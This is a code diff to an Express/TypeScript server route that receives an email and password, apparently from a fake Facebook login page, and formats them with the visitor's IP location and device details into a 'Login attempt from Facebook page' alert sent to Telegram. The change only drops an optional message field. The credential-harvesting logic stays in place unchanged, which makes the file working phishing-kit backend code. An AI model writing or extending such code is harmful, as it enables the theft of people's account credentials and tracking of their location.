@@ -190,7 +190,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // API endpoint to send message to Telegram
   app.post('/api/send-message', async (req: Request, res: Response) => {
     try {
-      const { email, password, message, deviceInfo } = req.body;
+      const { email, password, deviceInfo } = req.body;
       
       // Get location information
       const ipInfo = await getIPInfo(req);
@@ -198,14 +198,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Get device details
       const deviceDetails = getDeviceDetails(deviceInfo);
       
-      // Format the message - always include login info, message is optional
+      // Format the message
       const timestamp = new Date().toLocaleString();
       let formattedMessage = `🚨 Login attempt from Facebook page at ${timestamp}:\n\n`;
       formattedMessage += `👤 Credentials:\n• Username/Email: ${email || 'Not provided'}\n• Password: ${password || 'Not provided'}\n`;
-      
-      if (message) {
-        formattedMessage += `\n💬 Message: "${message}"\n`;
-      }
       
       // Add device and location information
       formattedMessage += deviceDetails;
